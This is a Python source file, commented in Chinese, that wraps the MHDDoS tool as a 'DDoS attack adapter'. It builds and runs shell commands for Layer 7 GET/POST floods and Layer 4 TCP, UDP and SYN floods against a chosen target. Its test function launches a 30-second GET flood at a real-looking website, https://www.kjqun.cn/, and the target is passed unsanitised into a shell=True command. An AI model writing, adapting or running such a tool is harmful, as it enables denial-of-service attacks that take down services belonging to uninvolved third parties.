#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS攻击适配器 - 专门处理MHDDoS工具的执行
"""

import subprocess
import json
import time
import os
from datetime import datetime

class DDoSAdapter:
    """DDoS攻击适配器"""
    
    def __init__(self):
        self.supported_methods = {
            "GET": "Layer7 GET攻击",
            "POST": "Layer7 POST攻击", 
            "TCP": "Layer4 TCP攻击",
            "UDP": "Layer4 UDP攻击",
            "SYN": "Layer4 SYN洪水攻击"
        }
    
    def execute_ddos_attack(self, method, target, threads=100, duration=60, proxy_type=0):
        """执行DDoS攻击"""
        
        # 验证参数
        if method not in self.supported_methods:
            return False, f"不支持的攻击方法: {method}"
        
        if not target:
            return False, "目标地址不能为空"
        
        # 构建命令
        if method in ["GET", "POST"]:
            # Layer7 攻击
            command = f"python start.py {method} {target} {proxy_type} {threads} proxies.txt 100 {duration}"
        else:
            # Layer4 攻击
            command = f"python start.py {method} {target} {threads} {duration}"
        
        try:
            # 执行攻击
            process = subprocess.Popen(command, shell=True, 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE,
                                     text=True)
            
            # 实时读取输出
            output_lines = []
            start_time = time.time()
            
            while True:
                # 检查是否超时
                if time.time() - start_time > duration + 10:  # 额外10秒缓冲
                    process.terminate()
                    output_lines.append("⏰ 攻击时间结束，自动停止")
                    break
                
                # 读取输出
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    output_lines.append(output.strip())
            
            # 检查错误
            stderr = process.stderr.read()
            
            # 过滤掉警告信息
            filtered_output = []
            for line in output_lines:
                if "DeprecationWarning" not in line and "RequestsDependencyWarning" not in line:
                    filtered_output.append(line)
            
            result = "\n".join(filtered_output)
            
            if stderr and "DeprecationWarning" not in stderr and "RequestsDependencyWarning" not in stderr:
                return False, f"执行错误: {stderr}"
            
            return True, result
            
        except Exception as e:
            return False, f"执行异常: {e}"
    
    def get_attack_info(self, method, target, threads, duration):
        """获取攻击信息"""
        return {
            "method": method,
            "method_name": self.supported_methods.get(method, "未知方法"),
            "target": target,
            "threads": threads,
            "duration": duration,
            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    
    def create_attack_config(self, method, target, threads=100, duration=60):
        """创建攻击配置文件"""
        config = {
            "attack_type": "ddos",
            "method": method,
            "target": target,
            "threads": threads,
            "duration": duration,
            "timestamp": datetime.now().isoformat()
        }
        
        filename = f"ddos_attack_{method}_{int(time.time())}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        
        return filename

def test_ddos_adapter():
    """测试DDoS适配器"""
    adapter = DDoSAdapter()
    
    # 测试GET攻击
    success, result = adapter.execute_ddos_attack(
        method="GET",
        target="https://www.kjqun.cn/",
        threads=50,
        duration=30
    )
    
    print(f"攻击结果: {success}")
    print(f"输出: {result}")

if __name__ == "__main__":
    test_ddos_adapter()